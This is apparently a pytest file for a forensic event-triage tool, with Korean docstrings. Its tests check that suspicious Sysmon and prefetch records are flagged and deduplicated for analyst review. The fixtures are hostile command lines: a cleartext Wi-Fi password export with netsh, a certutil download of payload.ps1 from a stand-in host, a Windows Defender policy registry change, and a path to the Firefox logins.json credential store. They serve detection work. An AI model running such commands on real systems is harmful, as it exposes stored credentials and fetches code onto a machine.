from pathlib import Path

from src.common import attention_policy
from src.stage05_interpret import allocation, attention
from src.stage04_parse import flagging


def _record(ref, command, *, flags=None):
    return {
        "ref": ref,
        "artifact": "evtx:Sysmon",
        "record_num": int(ref.split("#")[1]),
        "offset": "0x0",
        "flags": flags or [],
        "event_id": 1,
        "timestamp": "2026-09-07T06:30:10Z",
        "fields": {"CommandLine": command},
    }


def test_high_value_observations_are_neutral_attention_signals():
    records = attention.apply([
        _record("SYSMON#1", r"netsh wlan export profile key=clear folder=C:\\Temp"),
        _record("SYSMON#2", r"msedge.exe --no-sandbox"),
    ])
    assert records[0]["must_review"] is True
    assert "credential_export_option_observed" in records[0]["attention_signals"]
    assert "key=clear" in records[0]["attention_context"]["credential_export_option_observed"][0]
    assert records[0]["attention_requirements"]["credential_export_option_observed"] == {
        "all": ["netsh", "wlan", "key=clear"]
    }
    assert "browser_sandbox_disabled" in records[1]["attention_signals"]
    assert all("malicious" not in signal for record in records for signal in record["attention_signals"])


def test_high_value_flag_families_get_one_mandatory_representative_each():
    first_download = _record(
        "SYSMON#10", "certutil -urlcache -split -f http://example.test/a payload.ps1",
        flags=["lolbin_download"],
    )
    duplicate_download = _record(
        "SYSMON#11", "certutil -urlcache -split -f http://example.test/b other.ps1",
        flags=["lolbin_download"],
    )
    defender = _record(
        "SYSMON#12", "reg add HKLM\\Software\\Policies\\Microsoft\\Windows Defender",
        flags=["security_tool_config_changed"],
    )

    got = attention.apply([duplicate_download, defender, first_download])
    required = [record for record in got if record.get("must_review")]

    assert {record["ref"] for record in required} == {"SYSMON#10", "SYSMON#12"}
    assert required[0]["attention_requirements"]["security_tool_config_change_observed"] == {
        "flags": ["security_tool_config_changed"]
    }
    download = next(record for record in required if record["ref"] == "SYSMON#10")
    assert "certutil" in download["attention_context"]["lolbin_download_observed"][0].lower()


def test_generic_fanout_is_context_not_a_global_mandatory_signal():
    record = _record("SYSMON#9", "browser.exe")
    record["incident_context"] = {"children_within_2s": 12}
    assert "rapid_process_fanout_observed" not in attention.signal_ids(record)


def test_must_review_record_survives_a_one_seat_quota():
    ordinary = _record("SYSMON#1", "ordinary.exe", flags=["execution_from_unusual_path"])
    required = attention.apply([_record("SYSMON#2", "netsh wlan export profile key=clear")])[0]
    selected, _, _ = allocation.allocate_records([ordinary, required], limit=1)
    assert any(record["ref"] == "SYSMON#2" for record in selected)


def test_duplicate_signal_family_gets_one_disposition_representative():
    cmd = _record("SYSMON#1", "cmd /c netsh wlan export profile key=clear")
    netsh = _record("SYSMON#2", "netsh wlan export profile key=clear")
    netsh["fields"]["Image"] = r"C:\\Windows\\System32\\netsh.exe"
    got = attention.apply([cmd, netsh])
    assert sum(bool(record.get("must_review")) for record in got) == 1
    assert got[1]["must_review"] is True


def test_t1555_vocabulary_drives_attention_and_prompt_preservation():
    paths = [rf"C:\\Windows\\System32\\{index}.dll" for index in range(30)]
    paths[29] = r"C:\\Users\\test\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\x\\logins.json"
    record = {"ref": "PF#1", "artifact": "prefetch", "fields": {"loaded_files": paths}}

    enriched = attention.apply([record])[0]
    trimmed = allocation.for_prompt(record, 5, flagging.prompt_keep_paths())

    assert enriched["attention_signals"] == ["sensitive_credential_store_referenced"]
    assert paths[29] in enriched["attention_context"]["sensitive_credential_store_referenced"]
    assert "\\logins.json" in enriched["attention_requirements"]["sensitive_credential_store_referenced"]["any"]
    assert paths[29] in trimmed["fields"]["loaded_files"]


def test_signal_vocabulary_only_looks_at_the_fields_it_declares():
    r"""``match_fields`` 를 안 적으면 레코드의 모든 문자열이 대상이 된다.

    그러면 시각 어휘 `1970-` 가 `C:\photos\1970-summer.jpg` 같은 정상 경로에
    걸려 보장 레인 한 자리를 먹는다(2026-09-08 확인).
    """
    innocent = {
        "ref": "MFT#1", "artifact": "$MFT", "timestamp": "2026-09-08T10:00:00Z",
        "fields": {"TargetFilename": r"C:\photos970-summer.jpg"},
    }
    genuine = {"ref": "MFT#2", "artifact": "$MFT", "timestamp": "1970-01-01T00:00:00Z", "fields": {}}

    assert attention.signal_ids(innocent) == []
    assert attention.signal_ids(genuine) == ["epoch_timestamp_observed"]


def test_representative_priority_is_declared_not_hardcoded():
    """대표 선택 우선순위에 실행 파일 이름을 파이썬에 적지 않는다.

    적으면 그 표본에서만 맞는 값이 코드에 남는다 — `z7hriire.exe` 는 SVCStealer
    가 그 실행에서 만든 무작위 이름이라 다른 어떤 증거에도 존재하지 않는다.
    YAML 에 없는 이름은 어느 것도 가점을 받지 않아야 한다.
    """
    source = (Path(__file__).resolve().parents[1] / "src" / "stage05_interpret" / "attention.py").read_text(encoding="utf-8")
    assert ".exe" not in source

    policy = attention_policy.load()
    declared = {
        name
        for rule in policy.signals for name in rule.representative_images
    } | {
        name for group in policy.path_groups for name in group.representative_images
    }
    assert "netsh.exe" in declared and "z7hriire.exe" not in declared


def test_representative_tie_breaks_on_first_observation_not_ref_text():
    """동점이면 먼저 관측된 것이 대표다.

    ref 문자열로 가르면 사전순이라 `SYSMON#99` 가 `SYSMON#1000` 보다 커져
    선택이 사실과 무관해진다.
    """
    early = _record("SYSMON#1000", "installer.exe /verysilent")
    early["timestamp"] = "2026-09-07T06:30:10Z"
    late = _record("SYSMON#99", "installer.exe /verysilent")
    late["timestamp"] = "2026-09-07T06:31:00Z"

    got = attention.apply([late, early])
    representative = [record["ref"] for record in got if record.get("must_review")]
    assert representative == ["SYSMON#1000"]


def _timed(ref, command, when, *, flags=None, image="tool.exe"):
    record = _record(ref, command, flags=flags)
    record["timestamp"] = when
    record["fields"]["Image"] = image
    return record


def test_identical_commands_do_not_eat_every_representative_seat():
    """같은 명령행의 되풀이는 가짓수가 아니다.

    실측(``K2L7``, 2026-09-10): ``execution_from_unusual_path`` 다섯 자리를
    한 가지 명령행이 다섯 번 반복해 전부 가져갔다. 그 신호는 이름을 모르는
    도구를 자리로 잡는 유일한 레인이라, 되풀이가 자리를 다 먹으면 레인이
    통째로 무의미해진다.
    """
    repeated = [
        _timed(f"SYSMON#{100 + i}", "collect --tsource C:", f"2026-09-08T0{i}:00:00Z",
               flags=["execution_from_unusual_path"], image="repeat.exe")
        for i in range(5)
    ]
    others = [
        _timed(f"SYSMON#{200 + i}", f"other --{name}", f"2026-09-08T0{5 + i}:00:00Z",
               flags=["execution_from_unusual_path"], image=f"{name}.exe")
        for i, name in enumerate(("one", "two", "three"))
    ]

    chosen = [
        record for record in attention.apply(repeated + others)
        if "execution_from_unusual_path_observed" in (record.get("attention_signals") or [])
    ]
    commands = [record["fields"]["CommandLine"] for record in chosen]

    assert len(chosen) == 5, "자릿수 자체는 그대로다 — 줄이는 것이 목적이 아니다"
    assert commands.count("collect --tsource C:") == attention.MAX_IDENTICAL_COMMANDS
    assert len(set(commands)) == 4, "남은 자리가 다른 가짓수에 열린다"


def test_seats_are_refilled_when_there_is_nothing_else_to_show():
    """가짓수가 자릿수보다 적으면 자리를 비워 두지 않는다.

    실측(``K2L7-POS``)에서 그 신호의 후보 8건이 **전부** 같은 명령행이었다.
    상한만 걸고 끝내면 다섯 자리가 두 자리로 줄어 관측이 조용히 사라진다.
    """
    only_one_kind = [
        _timed(f"SYSMON#{300 + i}", "collect --tsource C:", f"2026-09-08T0{i}:00:00Z",
               flags=["execution_from_unusual_path"], image="repeat.exe")
        for i in range(8)
    ]

    chosen = [
        record for record in attention.apply(only_one_kind)
        if "execution_from_unusual_path_observed" in (record.get("attention_signals") or [])
    ]
    assert len(chosen) == 5, "되풀이밖에 없으면 되풀이로 채운다"


def test_records_without_a_command_line_are_not_folded_together():
    """명령행이 없는 아티팩트를 한 덩어리로 묶지 않는다.

    레지스트리 키나 evtx 레코드는 ``Image``·``CommandLine`` 이 비어 있다.
    빈 값을 열쇠로 쓰면 서로 다른 관측이 같은 행위가 되어 상한에 걸린다.
    """
    blank = []
    for i in range(4):
        record = _record(f"SYSMON#{400 + i}", None, flags=["execution_from_unusual_path"])
        record["timestamp"] = f"2026-09-08T0{i}:00:00Z"
        record["fields"] = {}
        blank.append(record)

    chosen = [
        record for record in attention.apply(blank)
        if "execution_from_unusual_path_observed" in (record.get("attention_signals") or [])
    ]
    assert len(chosen) == 4, "명령행이 없다는 이유로 되풀이 취급되지 않는다"
